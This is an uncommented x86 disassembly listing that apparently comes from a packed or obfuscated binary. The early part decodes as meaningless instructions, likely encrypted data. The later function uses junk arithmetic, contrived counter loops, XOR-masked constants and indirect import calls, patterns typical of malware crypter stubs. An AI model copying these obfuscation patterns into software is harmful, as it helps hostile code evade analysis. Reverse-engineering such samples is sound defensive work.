  4057bf:	shl    BYTE PTR [eax],cl
  4057c1:	pop    ss
  4057c2:	cs or  al,0x8c
  4057c5:	or     eax,0xded5e3cb
  4057ca:	jmp    0x405773
  4057cc:	sti    
  4057cd:	ins    DWORD PTR es:[edi],dx
  4057ce:	fst    QWORD PTR [esi-0x5f118e43]
  4057d4:	imul   BYTE PTR [ebp+0x5e]
  4057d7:	scas   al,BYTE PTR es:[edi]
  4057d8:	popa   
  4057d9:	or     al,0x81
  4057db:	ins    DWORD PTR es:[edi],dx
  4057dc:	dec    ebx
  4057dd:	lock mov eax,0x7c5d37cf
  4057e3:	push   edx
  4057e4:	xor    DWORD PTR [esp+edi*1-0x3a],edi
  4057e8:	popf   
  4057e9:	cmp    BYTE PTR ss:[edi+0x38],ah
  4057ed:	aam    0xa1
  4057ef:	fadd   DWORD PTR [esi+0x1d]
  4057f2:	add    DWORD PTR [ecx-0x5547e0da],ecx
  4057f8:	or     al,0x51
  4057fa:	mov    al,0xd6
  4057fc:	cs pop es
  4057fe:	mov    BYTE PTR [ecx+0x0],0x58
  405802:	stos   BYTE PTR es:[edi],al
  405803:	sub    ebp,eax
  405805:	mov    eax,ds:0x52e36ab7
  40580a:	xchg   ebx,eax
  40580b:	fwait
  40580c:	stc    
  40580d:	sub    DWORD PTR [ecx-0x33],edx
  405810:	cld    
  405811:	or     cl,BYTE PTR [edi-0x8]
  405814:	int    0xde
  405816:	or     al,0x56
  405818:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405819:	aaa    
  40581a:	lahf   
  40581b:	lods   al,BYTE PTR ds:[esi]
  40581c:	mov    esp,0x9c181666
  405821:	leave  
  405822:	lods   eax,DWORD PTR ds:[esi]
  405823:	adc    eax,0x4947b738
  405828:	aas    
  405829:	sub    BYTE PTR [edi+0x5b4b8294],0xa6
  405830:	mov    al,0xe4
  405832:	nop
  405833:	fidivr WORD PTR ds:0x510bdd65
  405839:	ins    DWORD PTR es:[edi],dx
  40583a:	sbb    al,0x8
  40583c:	pop    ebx
  40583d:	fsub   DWORD PTR [eax]
  40583f:	test   al,0x9b
  405841:	fild   QWORD PTR [eax+0x7c]
  405844:	mov    ds:0x6af67486,al
  405849:	push   es
  40584a:	bound  edx,QWORD PTR [esi]
  40584c:	adc    al,0x5e
  40584e:	pop    ss
  40584f:	pop    esp
  405850:	jnp    0x4058d1
  405852:	or     al,0x16
  405854:	or     dh,ah
  405856:	repz sahf 
  405858:	lods   eax,DWORD PTR ds:[esi]
  405859:	cmc    
  40585a:	or     eax,0x28a8966a
  40585f:	mov    bh,0x55
  405861:	(bad)  
  405862:	call   0xd171:0xd084b2c2
  405869:	dec    ebp
  40586a:	(bad)  
  40586b:	jnp    0x4058ec
  40586d:	clc    
  40586e:	call   0x698b:0x719bb5
  405875:	dec    edx
  405876:	jmp    0xbef8:0xc7cf28f4
  40587d:	cmp    al,0x11
  40587f:	call   0xc12e:0x6059c652
  405886:	xchg   DWORD PTR [eax],esi
  405888:	push   0x5b25ec86
  40588d:	stos   DWORD PTR es:[edi],eax
  40588e:	adc    dh,BYTE PTR [edi+0x4a3d98e0]
  405894:	or     al,BYTE PTR [edx-0x367a06e7]
  40589a:	sbb    DWORD PTR [ebx+0x65],edx
  40589d:	aad    0x96
  40589f:	retf   
  4058a0:	lods   eax,DWORD PTR ds:[esi]
  4058a1:	mov    BYTE PTR [ecx+0x7cb09a9a],al
  4058a7:	adc    BYTE PTR [ebx-0xc74310e],bl
  4058ad:	xchg   edx,eax
  4058ae:	jg     0x405873
  4058b0:	inc    ecx
  4058b1:	cmp    BYTE PTR [ebp-0x6c],al
  4058b4:	mov    BYTE PTR [edi],al
  4058b6:	outs   dx,DWORD PTR ds:[esi]
  4058b7:	sbb    DWORD PTR [ebp-0x2e6ce41c],0x3f2e90a7
  4058c1:	jns    0x405897
  4058c3:	test   al,0xf6
  4058c5:	(bad)  
  4058c6:	in     eax,0x27
  4058c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4058c9:	or     DWORD PTR [ebx+ecx*2-0x1cb23e51],ebx
  4058d0:	xchg   ebx,eax
  4058d1:	les    ebx,FWORD PTR [ebx-0x30cad1d4]
  4058d7:	jb     0x4058c4
  4058d9:	jl     0x4058ca
  4058db:	fnstsw WORD PTR [edi+esi*4-0x430063b2]
  4058e2:	sti    
  4058e3:	sbb    al,0xdb
  4058e5:	or     BYTE PTR [ecx+eiz*2-0x41],dh
  4058e9:	xchg   BYTE PTR [esp+ecx*4-0x40],ch
  4058ed:	xor    BYTE PTR [esi],al
  4058ef:	arpl   WORD PTR [ebp+0x7a],sp
  4058f2:	loopne 0x40589f
  4058f4:	popa   
  4058f5:	mov    ebp,0x5dd39e1b
  4058fa:	(bad)  
  4058fb:	fsub   st,st(4)
  4058fd:	outs   dx,BYTE PTR ds:[esi]
  4058fe:	add    DWORD PTR [esi+0x16907919],0x53389662
  405908:	mov    cl,0xcd
  40590a:	hlt    
  40590b:	jg     0x405911
  40590d:	test   eax,0x77e588e5
  405912:	pop    ecx
  405913:	mov    esp,DWORD PTR [edx+0x70e42091]
  405919:	dec    edi
  40591a:	push   edi
  40591b:	pop    ecx
  40591c:	retf   
  40591d:	xchg   ebp,eax
  40591e:	in     al,dx
  40591f:	(bad)  
  405921:	mov    WORD PTR [ebp+esi*4-0x1bdf6037],es
  405928:	sahf   
  405929:	sahf   
  40592a:	dec    edx
  40592b:	dec    edi
  40592c:	xchg   ecx,eax
  40592d:	sti    
  40592e:	inc    edx
  40592f:	and    dl,BYTE PTR [ecx+ebp*2-0x6c]
  405933:	mov    bl,0xdf
  405935:	sub    DWORD PTR [ebx+0x5f],ecx
  405938:	inc    BYTE PTR [esi-0xe57a63f]
  40593e:	adc    bh,BYTE PTR [edi+ecx*4-0x587add6a]
  405945:	xchg   ebx,eax
  405946:	loopne 0x405983
  405948:	mov    eax,ds:0x4d64a205
  40594d:	mov    ds:0x1de749a2,al
  405952:	popf   
  405953:	pop    ss
  405954:	push   edi
  405955:	rcl    BYTE PTR [edi+eax*4+0x50c2936e],0x75
  40595d:	push   ebp
  40595e:	fld    QWORD PTR [eax-0x45]
  405961:	add    ch,BYTE PTR [esi+0x6676f7]
  405967:	cmp    ebp,eax
  405969:	sub    DWORD PTR [eax],ebx
  40596b:	retf   0x958f
  40596e:	sbb    eax,0xf35da20
  405973:	sub    eax,0x24ee9db5
  405978:	and    ebp,edi
  40597a:	dec    ecx
  40597b:	push   ss
  40597c:	dec    ebx
  40597d:	shr    BYTE PTR [ecx+esi*1+0x4da98eef],1
  405984:	mov    edi,0x9bd0d14c
  405989:	loopne 0x405988
  40598b:	lods   eax,DWORD PTR ds:[esi]
  40598c:	into   
  40598d:	je     0x40593d
  40598f:	mov    al,ds:0x5eb38
  405994:	pop    es
  405995:	pop    ss
  405996:	mov    dl,0xc1
  405998:	dec    esi
  405999:	mov    ds,WORD PTR [edi+0xb9160cc]
  40599f:	pop    esp
  4059a0:	and    BYTE PTR [ecx-0x20],ah
  4059a3:	adc    dl,dl
  4059a5:	mov    ecx,0x5f466713
  4059aa:	pop    esp
  4059ab:	xor    ebx,DWORD PTR [eax]
  4059ad:	and    edi,ebp
  4059af:	repz out 0x4f,eax
  4059b2:	or     al,0x37
  4059b4:	mov    ds:0x3be4c675,al
  4059b9:	fwait
  4059ba:	popf   
  4059bb:	int3   
  4059bc:	mov    bh,0xa0
  4059be:	fidivr DWORD PTR [eax-0x1b260ce5]
  4059c4:	fstp   QWORD PTR [ebx-0x716db1a9]
  4059ca:	out    0x1e,al
  4059cc:	add    DWORD PTR [edx+0x7ea7ca12],edi
  4059d2:	fsub   QWORD PTR [edx-0x2222a86a]
  4059d8:	sbb    esi,ebp
  4059da:	in     al,dx
  4059db:	jl     0x40597a
  4059dd:	std    
  4059de:	adc    ecx,DWORD PTR [edx]
  4059e0:	call   0xd00e9a7f
  4059e5:	add    eax,0x829d05ee
  4059ea:	sbb    eax,0xa7610310
  4059ef:	inc    ebx
  4059f0:	dec    edi
  4059f1:	retf   
  4059f2:	xchg   edx,eax
  4059f3:	jge    0x405a01
  4059f5:	pop    ds
  4059f6:	in     al,dx
  4059f7:	fstp   QWORD PTR [ebp+ebx*4+0x49]
  4059fb:	les    esp,FWORD PTR [edi]
  4059fd:	fwait
  4059fe:	mov    edx,0x7e6c7ed1
  405a03:	push   cs
  405a04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405a05:	in     al,dx
  405a06:	loopne 0x4059b1
  405a08:	add    edx,ebp
  405a0a:	mov    ecx,0x7dd660b8
  405a0f:	jno    0x405a22
  405a11:	mov    al,0x43
  405a13:	(bad)  
  405a14:	fst    st(2)
  405a16:	adc    DWORD PTR [edi+0x5b],ecx
  405a19:	jne    0x405a41
  405a1b:	dec    esi
  405a1c:	cs jno 0x405a23
  405a1f:	push   esp
  405a20:	enter  0x782a,0x7
  405a24:	sub    ch,ch
  405a26:	or     DWORD PTR [ebp+edi*4+0x26],edi
  405a2a:	mov    ds:0x6f666ea0,eax
  405a2f:	sbb    BYTE PTR [eax],ah
  405a31:	ror    BYTE PTR [esi+eiz*2+0x5c],0x22
  405a36:	retf   0x1880
  405a39:	push   0x23
  405a3b:	scas   eax,DWORD PTR es:[edi]
  405a3c:	lea    ebx,[esi+0x1c]
  405a3f:	lahf   
  405a40:	fisub  WORD PTR [edi-0x6c]
  405a43:	loopne 0x4059f4
  405a45:	ffree  st(3)
  405a47:	cli    
  405a48:	add    DWORD PTR [ebp+0x40],esp
  405a4b:	mov    esi,0x7de70c0e
  405a50:	push   0x2b
  405a52:	popf   
  405a53:	out    dx,eax
  405a54:	sub    ebx,edi
  405a56:	push   es
  405a57:	add    dl,BYTE PTR [ebx]
  405a59:	cmp    dh,BYTE PTR [edi-0x43]
  405a5c:	pop    edi
  405a5d:	mov    dl,0xb4
  405a5f:	and    DWORD PTR [eax+esi*4-0x59],ecx
  405a63:	aad    0xdd
  405a65:	ror    BYTE PTR [edx+0x17375eb0],1
  405a6b:	scas   al,BYTE PTR es:[edi]
  405a6c:	outs   dx,DWORD PTR ds:[esi]
  405a6d:	std    
  405a6e:	outs   dx,DWORD PTR ds:[esi]
  405a6f:	arpl   WORD PTR [esp+esi*2],bx
  405a72:	jg     0x405a45
  405a74:	out    dx,al
  405a75:	into   
  405a76:	ins    BYTE PTR es:[edi],dx
  405a77:	inc    esp
  405a78:	jecxz  0x405abc
  405a7a:	rcl    DWORD PTR [ebp-0x26],1
  405a7d:	jbe    0x405a30
  405a7f:	(bad)  
  405a80:	cmp    ch,cl
  405a82:	pop    edx
  405a83:	sub    ah,BYTE PTR es:[edi-0x43282dce]
  405a8a:	pop    edi
  405a8b:	ja     0x405a81
  405a8d:	popa   
  405a8e:	out    dx,eax
  405a8f:	push   edx
  405a90:	dec    esp
  405a91:	cld    
  405a92:	pop    esp
  405a93:	jle    0x405a7e
  405a95:	add    al,0x2d
  405a97:	aad    0x23
  405a99:	add    ebx,DWORD PTR [edi+0x6ff237f8]
  405a9f:	dec    eax
  405aa0:	pop    es
  405aa1:	js     0x405a7b
  405aa3:	sub    BYTE PTR [ebp-0x2d],ch
  405aa6:	xor    dl,BYTE PTR [eax-0x7446166d]
  405aac:	mov    eax,0xb0f76d6c
  405ab1:	dec    edi
  405ab2:	lods   al,BYTE PTR ds:[esi]
  405ab3:	or     BYTE PTR [ebx],ch
  405ab5:	clc    
  405ab6:	add    ebx,DWORD PTR [edx-0x12162657]
  405abc:	clc    
  405abd:	jge    0x405a86
  405abf:	ja     0x405a5b
  405ac1:	mov    ebp,0x80ed1cc5
  405ac6:	inc    ebx
  405ac7:	sub    ecx,DWORD PTR [edi+ebx*1+0x1]
  405acb:	cmp    DWORD PTR [ebp+0x35],ebp
  405ace:	lahf   
  405acf:	jmp    0x3154:0xfb4ce734
  405ad6:	scas   al,BYTE PTR es:[edi]
  405ad7:	jne    0x405a92
  405ad9:	or     al,0x5a
  405adb:	cmp    eax,0x3ee705df
  405ae0:	push   edi
  405ae1:	(bad)  
  405ae2:	out    0xd6,eax
  405ae4:	arpl   WORD PTR ds:0xaeff30b3,cx
  405aea:	adc    DWORD PTR ds:0xacf1138e,esp
  405af0:	jno    0x405aac
  405af2:	adc    BYTE PTR [esi],ah
  405af4:	rcl    DWORD PTR [edi+0x34de12c2],1
  405afa:	(bad)  
  405afb:	lods   al,BYTE PTR ds:[esi]
  405afc:	sub    edi,ebx
  405afe:	mov    edi,DWORD PTR [esi+0x7a]
  405b01:	mov    eax,ds:0x6269a7fb
  405b06:	ss ins DWORD PTR es:[edi],dx
  405b08:	xor    al,0x90
  405b0a:	cli    
  405b0b:	inc    ebx
  405b0c:	xor    ax,0x4292
  405b10:	mov    ah,0x48
  405b12:	sub    DWORD PTR [edi-0x7c],0xffffffd1
  405b16:	sub    al,0x16
  405b18:	jp     0x405aa9
  405b1a:	sbb    BYTE PTR [ecx],bl
  405b1c:	and    BYTE PTR [eax-0x2c125a8a],ch
  405b22:	into   
  405b23:	mov    esp,0xbf2fe151
  405b28:	mov    eax,ds:0xb0cde6ef
  405b2d:	je     0x405b75
  405b2f:	shl    BYTE PTR [eax-0x21],1
  405b32:	mov    esp,0xd25bc123
  405b37:	loopne 0x405ae3
  405b39:	lahf   
  405b3a:	ret    
  405b3b:	mov    al,0x38
  405b3d:	aas    
  405b3e:	add    eax,0xcc9e7512
  405b43:	leave  
  405b44:	cld    
  405b45:	and    al,0x45
  405b47:	sub    al,0x90
  405b49:	push   esi
  405b4a:	jae    0x405bb9
  405b4c:	ins    BYTE PTR es:[edi],dx
  405b4d:	or     ebx,DWORD PTR [esi+0x40]
  405b50:	ss leave 
  405b52:	pop    ebp
  405b53:	loopne 0x405bc6
  405b55:	sahf   
  405b56:	pavgw  mm5,mm7
  405b59:	dec    esp
  405b5a:	int    0x88
  405b5c:	cmp    eax,0x64a10885
  405b61:	sub    BYTE PTR [ebx],ah
  405b63:	dec    eax
  405b64:	push   esp
  405b65:	cwde   
  405b66:	aam    0x3b
  405b68:	adc    DWORD PTR [edx],eax
  405b6a:	add    cl,bl
  405b6c:	mov    BYTE PTR [edi+0x5b6d94fa],0x57
  405b73:	jge    0x405bd4
  405b75:	mov    ebx,0xd5037a59
  405b7a:	popa   
  405b7b:	xor    DWORD PTR [ecx-0x5d],edi
  405b7e:	jae    0x405b15
  405b80:	pop    ss
  405b81:	mov    cl,0x2
  405b83:	mov    ?,WORD PTR [eax]
  405b85:	out    0x3f,al
  405b87:	adc    edi,DWORD PTR [ecx+edx*4]
  405b8a:	mov    DWORD PTR ss:[ebx],eax
  405b8d:	jbe    0x405be3
  405b8f:	ins    BYTE PTR es:[edi],dx
  405b90:	xchg   ecx,eax
  405b91:	not    BYTE PTR [eax+0x696d4938]
  405b97:	sbb    al,0xb8
  405b99:	mov    al,0xe9
  405b9b:	mov    esp,0x78392a45
  405ba0:	cmp    al,0x9c
  405ba2:	inc    edx
  405ba3:	push   es
  405ba4:	mov    ds:0xf227eee,eax
  405ba9:	inc    esp
  405baa:	popf   
  405bab:	test   BYTE PTR [esi],dh
  405bad:	dec    edx
  405bae:	loope  0x405bea
  405bb0:	jle    0x405b69
  405bb2:	imul   edx,DWORD PTR [edx],0x57
  405bb5:	adc    eax,0x931df674
  405bba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405bbb:	lea    edx,[eax-0x29148892]
  405bc1:	sub    esi,esi
  405bc3:	push   cs
  405bc4:	dec    DWORD PTR ds:0x632536c5
  405bca:	hlt    
  405bcb:	stos   BYTE PTR es:[edi],al
  405bcc:	cmp    BYTE PTR [ecx+eax*2+0x18],dh
  405bd0:	in     al,dx
  405bd1:	adc    DWORD PTR [esi-0x60d74395],esi
  405bd7:	lds    edx,FWORD PTR [esi]
  405bd9:	loopne 0x405c31
  405bdb:	fwait
  405bdc:	or     eax,0xa839317
  405be1:	ins    BYTE PTR es:[edi],dx
  405be2:	push   ebp
  405be3:	mov    al,0x26
  405be5:	outs   dx,BYTE PTR ds:[esi]
  405be6:	mov    ebp,edx
  405be8:	pop    ds
  405be9:	out    dx,eax
  405bea:	out    0xf7,al
  405bec:	cs adc al,0x70
  405bef:	sbb    edi,0x6a4f6cbf
  405bf5:	cli    
  405bf6:	ds push ss
  405bf8:	or     BYTE PTR [ecx+0x39],dh
  405bfb:	xchg   edi,eax
  405bfc:	push   ds
  405bfd:	sub    BYTE PTR [ebp-0x7b],0x51
  405c01:	sbb    edx,DWORD PTR [ebx]
  405c03:	hlt    
  405c04:	lea    ecx,[edi+0x18]
  405c07:	xchg   DWORD PTR [ebp-0x196628a4],ebp
  405c0d:	callw  0x7c80
  405c11:	enter  0xf457,0xf6
  405c15:	addr16 cmp eax,0x73dd21cf
  405c1b:	ss push esp
  405c1d:	jns    0x405c52
  405c1f:	addr16 std 
  405c21:	test   BYTE PTR [ebx+0x6b],0x2e
  405c25:	inc    edi
  405c26:	and    DWORD PTR [ecx],edx
  405c28:	imul   edx,DWORD PTR [eiz*1-0x7a5e6351],0xffffffdb
  405c30:	inc    esi
  405c31:	fst    DWORD PTR [esp+esi*1+0x7c]
  405c35:	mov    cs,WORD PTR [edx]
  405c37:	sbb    BYTE PTR [ecx+0x65f6b85e],0x90
  405c3e:	mov    esi,0xdbec1246
  405c43:	mov    dl,0x2e
  405c45:	mov    esi,fs
  405c47:	inc    ebx
  405c48:	scas   eax,DWORD PTR es:[edi]
  405c49:	jns    0x405bec
  405c4b:	rcr    BYTE PTR [edx],cl
  405c4d:	inc    edx
  405c4e:	add    bh,bh
  405c50:	xor    bh,bh
  405c52:	xor    eax,0x421d2e
  405c57:	push   DWORD PTR ds:0x421ada
  405c5d:	push   DWORD PTR ds:0x421d0e
  405c63:	push   DWORD PTR ds:0x421da2
  405c69:	push   DWORD PTR [ebp-0x30]
  405c6c:	push   DWORD PTR [ebp-0x20]
  405c6f:	mov    eax,DWORD PTR [ebp-0x8]
  405c72:	mov    eax,DWORD PTR [eax]
  405c74:	mov    eax,DWORD PTR [eax]
  405c76:	mov    eax,DWORD PTR [eax]
  405c78:	call   eax
  405c7a:	mov    eax,DWORD PTR [ebp-0x34]
  405c7d:	mov    ecx,DWORD PTR ds:0x421cd2
  405c83:	add    DWORD PTR [eax],ecx
  405c85:	pop    edi
  405c86:	pop    esi
  405c87:	leave  
  405c88:	ret    
  405c89:	push   ebp
  405c8a:	mov    ebp,esp
  405c8c:	sub    esp,0x58
  405c8f:	add    DWORD PTR ds:0x429008,0x42b004
  405c99:	push   ebx
  405c9a:	adc    DWORD PTR ds:0x42a018,0x429010
  405ca4:	push   esi
  405ca5:	push   edi
  405ca6:	and    DWORD PTR ds:0x42c00c,0x6433
  405cb0:	push   0x1f
  405cb2:	lea    eax,[ebp-0x58]
  405cb5:	push   eax
  405cb6:	adc    DWORD PTR ds:0x42a010,0x6fdc
  405cc0:	push   0x0
  405cc2:	sub    DWORD PTR ds:0x42b018,0x7ba7
  405ccc:	call   DWORD PTR ds:0x424034
  405cd2:	call   DWORD PTR ds:0x424004
  405cd8:	and    DWORD PTR ds:0x42a000,0x4473
  405ce2:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  405ce9:	and    DWORD PTR ds:0x429018,0x0
  405cf3:	mov    ebx,DWORD PTR ds:0x429018
  405cf9:	inc    ebx
  405cfa:	mov    DWORD PTR ds:0x429018,ebx
  405d00:	cmp    DWORD PTR ds:0x429018,0x1f
  405d07:	jne    0x405d1d
  405d0d:	push   0x42b00c
  405d12:	push   0x7f05
  405d17:	call   DWORD PTR ds:0x42403c
  405d1d:	cmp    DWORD PTR ds:0x429018,0x19
  405d24:	jb     0x405cf3
  405d2a:	add    ebx,DWORD PTR ds:0x42a008
  405d30:	mov    DWORD PTR [ebp-0x14],0xf89c85b5
  405d37:	mov    ecx,DWORD PTR [ebp-0x4]
  405d3a:	mov    ebx,0x7510893
  405d3f:	xor    ecx,ebx
  405d41:	or     DWORD PTR ds:0x42b00c,edx
  405d47:	mov    eax,0x3272db
  405d4c:	add    ecx,eax
  405d4e:	sub    DWORD PTR ds:0x42a010,0x429004
  405d58:	mov    DWORD PTR [ebp-0x1c],ecx
  405d5b:	mov    ecx,DWORD PTR [ebp+0x14]
  405d5e:	mov    DWORD PTR ds:0x42800c,0x25aa
  405d68:	test   ecx,ecx
  405d6a:	mov    DWORD PTR ds:0x428000,0x5e1a
  405d74:	je     0x405d92
  405d7a:	sub    DWORD PTR ds:0x42b018,0x6b15
  405d84:	mov    ecx,DWORD PTR [ebp+0x14]
  405d87:	mov    ecx,DWORD PTR [ecx]
  405d89:	add    DWORD PTR ds:0x42a000,ecx
  405d8f:	mov    DWORD PTR [ebp-0x1c],ecx
  405d92:	and    DWORD PTR ds:0x42a010,0x0
  405d9c:	mov    edi,DWORD PTR ds:0x42a010
  405da2:	inc    edi
  405da3:	mov    DWORD PTR ds:0x42a010,edi
  405da9:	cmp    DWORD PTR ds:0x42a010,0x9
  405db0:	jne    0x405dc4
  405db6:	push   DWORD PTR [ebp-0x14]
  405db9:	push   0x423837
  405dbe:	call   DWORD PTR ds:0x424040
  405dc4:	cmp    DWORD PTR ds:0x42a010,0x8
  405dcb:	jne    0x405dde
  405dd1:	mov    edi,DWORD PTR ds:0x42a010
  405dd7:	inc    edi
  405dd8:	mov    DWORD PTR ds:0x42a010,edi
  405dde:	cmp    DWORD PTR ds:0x42a010,0x13
  405de5:	jb     0x405d9c
  405deb:	mov    ecx,0x457a
  405df0:	imul   edx,eax
  405df3:	mov    esi,0x787f
  405df8:	or     DWORD PTR ds:0x428004,0x4238
  405e02:	add    edx,ecx
  405e04:	sbb    DWORD PTR ds:0x429014,0x4641
  405e0e:	xchg   esi,ecx
  405e10:	xor    DWORD PTR ds:0x42801c,edi
  405e16:	mov    edi,0x155c
  405e1b:	sub    edx,edi
  405e1d:	and    DWORD PTR ds:0x42901c,0x60c1
  405e27:	mov    ecx,DWORD PTR [ebp-0x4]
  405e2a:	xor    ecx,ebx
  405e2c:	and    DWORD PTR ds:0x42b014,0x0
  405e36:	mov    esi,DWORD PTR ds:0x42b014
  405e3c:	inc    esi
  405e3d:	mov    DWORD PTR ds:0x42b014,esi
  405e43:	cmp    DWORD PTR ds:0x42b014,0x10
  405e4a:	jne    0x405e5b
  405e50:	push   0x4237f6
  405e55:	call   DWORD PTR ds:0x424044
  405e5b:	cmp    DWORD PTR ds:0x42b014,0xf
  405e62:	jne    0x405e75
  405e68:	mov    esi,DWORD PTR ds:0x42b014
  405e6e:	inc    esi
  405e6f:	mov    DWORD PTR ds:0x42b014,esi
  405e75:	cmp    DWORD PTR ds:0x42b014,0x1b
  405e7c:	jb     0x405e36
  405e82:	add    ecx,eax
  405e84:	sbb    esi,0x766b
  405e8a:	mov    DWORD PTR [ebp-0x8],ecx
  405e8d:	and    esi,0x21f
  405e93:	mov    ecx,DWORD PTR [ebp-0x14]
  405e96:	mov    DWORD PTR ds:0x42b000,0x19
  405ea0:	cmp    DWORD PTR ds:0x42b000,0x0
  405ea7:	je     0x405f01
  405ead:	cmp    DWORD PTR ds:0x42b000,0x4
  405eb4:	jne    0x405ecd
  405eba:	push   DWORD PTR [ebp-0x1c]
  405ebd:	push   0x429018
  405ec2:	push   0x423a62
  405ec7:	call   DWORD PTR ds:0x424048
  405ecd:	cmp    DWORD PTR ds:0x42b000,0x5
  405ed4:	jne    0x405ee7
  405eda:	mov    esi,DWORD PTR ds:0x42b000
  405ee0:	dec    esi
  405ee1:	mov    DWORD PTR ds:0x42b000,esi
  405ee7:	xor    esi,esi
  405ee9:	add    esi,DWORD PTR ds:0x42b000
  405eef:	dec    esi
  405ef0:	mov    DWORD PTR ds:0x42b000,esi
  405ef6:	jmp    0x405ea0
  405efb:	and    esi,0x686c
  405f01:	xor    ecx,ebx
  405f03:	add    ecx,eax
  405f05:	mov    DWORD PTR [ebp-0x24],ecx
  405f08:	adc    esi,ecx
  405f0a:	mov    ecx,DWORD PTR [ebp-0x4]
  405f0d:	and    DWORD PTR ds:0x428014,0x0
  405f17:	jmp    0x405f29
  405f1c:	mov    esi,DWORD PTR ds:0x428014
  405f22:	inc    esi
  405f23:	mov    DWORD PTR ds:0x428014,esi
  405f29:	cmp    DWORD PTR ds:0x428014,0x14
  405f30:	jae    0x405f5c
  405f36:	cmp    DWORD PTR ds:0x428014,0x1d
  405f3d:	jne    0x405f51
  405f43:	push   0x42b01c
  405f48:	push   DWORD PTR [ebp-0xc]
  405f4b:	call   DWORD PTR ds:0x424014
  405f51:	jmp    0x405f1c
  405f56:	xor    DWORD PTR ds:0x428018,ecx
  405f5c:	xor    ecx,ebx
  405f5e:	add    ecx,eax
  405f60:	add    DWORD PTR ds:0x428004,edx
  405f66:	mov    DWORD PTR [ebp-0x30],ecx
  405f69:	adc    DWORD PTR ds:0x42b01c,edi
  405f6f:	mov    esi,DWORD PTR [ebp-0x4]
  405f72:	xor    DWORD PTR ds:0x42800c,0x2f0f
  405f7c:	xor    esi,ebx
  405f7e:	and    DWORD PTR ds:0x429018,0x0
  405f88:	mov    ecx,DWORD PTR ds:0x429018
  405f8e:	inc    ecx
  405f8f:	mov    DWORD PTR ds:0x429018,ecx
  405f95:	cmp    DWORD PTR ds:0x429018,0x13
  405f9c:	jne    0x405fca
  405fa2:	push   DWORD PTR [ebp-0x18]
  405fa5:	push   0x42b018
  405faa:	push   0x8bc1
  405faf:	push   0x42a018
  405fb4:	push   0x81c2
  405fb9:	push   DWORD PTR [ebp-0x18]
  405fbc:	push   0x8630
  405fc1:	push   DWORD PTR [ebp-0x28]
  405fc4:	call   DWORD PTR ds:0x424018
  405fca:	cmp    DWORD PTR ds:0x429018,0x10
  405fd1:	jb     0x405f88
  405fd7:	movzx  ecx,WORD PTR ds:0x429008
  405fde:	sub    ecx,DWORD PTR ds:0x42a010
  405fe4:	mov    DWORD PTR ds:0x429008,ecx
  405fea:	add    esi,eax
  405fec:	mov    ecx,DWORD PTR [ebp-0x24]
  405fef:	sub    ecx,eax
  405ff1:	lea    edx,[esi-0x3272db]
  405ff7:	xor    DWORD PTR ds:0x428008,0x428000
  406001:	xor    ecx,ebx
  406003:	sub    DWORD PTR ds:0x42c01c,0x42b01c
  40600d:	xor    edx,ebx
  40600f:	cmp    edx,ecx
  406011:	mov    DWORD PTR ds:0x428000,0x76f
  40601b:	je     0x4062a3
  406021:	xor    DWORD PTR ds:0x42c010,edx
  406027:	mov    ecx,DWORD PTR [ebp-0x4]
  40602a:	xor    ecx,ebx
  40602c:	or     DWORD PTR ds:0x429014,0x42a01c
  406036:	add    ecx,eax
  406038:	cmp    esi,ecx
  40603a:	mov    DWORD PTR ds:0x42a01c,0x739d
  406044:	jne    0x406280
  40604a:	add    DWORD PTR ds:0x42a00c,0x429004
  406054:	push   DWORD PTR [ebp+0x8]
  406057:	call   0x413c14
  40605c:	mov    DWORD PTR [ebp-0x18],eax
  40605f:	mov    eax,DWORD PTR [ebp-0x4]
  406062:	mov    DWORD PTR ds:0x42c00c,0x1d
  40606c:	cmp    DWORD PTR ds:0x42c00c,0x0
  406073:	je     0x4060a7
  406079:	cmp    DWORD PTR ds:0x42c00c,0x21
  406080:	jne    0x40608f
  406086:	push   DWORD PTR [ebp-0xc]
  406089:	call   DWORD PTR ds:0x42401c
  40608f:	mov    edi,DWORD PTR ds:0x42c00c
  406095:	dec    edi
  406096:	mov    DWORD PTR ds:0x42c00c,edi
  40609c:	jmp    0x40606c
  4060a1:	adc    ecx,DWORD PTR ds:0x428008
  4060a7:	mov    ecx,DWORD PTR [ebp-0x18]
  4060aa:	and    DWORD PTR ds:0x42b01c,0x0
  4060b4:	mov    edi,DWORD PTR ds:0x42b01c
  4060ba:	inc    edi
  4060bb:	mov    DWORD PTR ds:0x42b01c,edi
  4060c1:	cmp    DWORD PTR ds:0x42b01c,0x23
  4060c8:	jne    0x4060da
  4060ce:	push   DWORD PTR [ebp-0x14]
  4060d1:	push   DWORD PTR [ebp-0x28]
  4060d4:	call   DWORD PTR ds:0x424020
  4060da:	cmp    DWORD PTR ds:0x42b01c,0x19
  4060e1:	jb     0x4060b4
  4060e7:	xor    eax,ebx
  4060e9:	add    DWORD PTR ds:0x429018,0x397c
  4060f3:	mov    edi,0x3272db
  4060f8:	sub    DWORD PTR ds:0x428020,0x386b
  406102:	add    eax,edi
  406104:	mov    DWORD PTR ds:0x42900c,0x67dc
  40610e:	cmp    ecx,eax
  406110:	mov    DWORD PTR ds:0x42c00c,0x661b
  40611a:	je     0x406313
  406120:	push   DWORD PTR [ebp-0x18]
  406123:	sub    DWORD PTR ds:0x42800c,0x42a014
  40612d:	push   DWORD PTR [ebp+0x8]
  406130:	and    DWORD PTR ds:0x42b000,0x429010
  40613a:	call   0x41b72b
  40613f:	sub    ecx,DWORD PTR ds:0x42a00c
  406145:	mov    DWORD PTR [ebp-0x18],eax
  406148:	xor    eax,eax
  40614a:	xor    eax,DWORD PTR ds:0x42a01c
  406150:	xor    DWORD PTR ds:0x428018,eax
  406156:	mov    eax,DWORD PTR [ebp-0x4]
  406159:	mov    ecx,DWORD PTR [ebp-0x18]
  40615c:	xor    eax,ebx
  40615e:	add    eax,edi
  406160:	cmp    ecx,eax
  406162:	je     0x406313
  406168:	mov    ecx,DWORD PTR ds:0x429010
  40616e:	add    DWORD PTR ds:0x42a010,ecx
  406174:	mov    eax,DWORD PTR [ebp-0x18]
  406177:	and    DWORD PTR ds:0x42a008,0x0
  406181:	jmp    0x406193
  406186:	mov    ecx,DWORD PTR ds:0x42a008
  40618c:	inc    ecx
  40618d:	mov    DWORD PTR ds:0x42a008,ecx
  406193:	cmp    DWORD PTR ds:0x42a008,0x14
  40619a:	jae    0x40621e
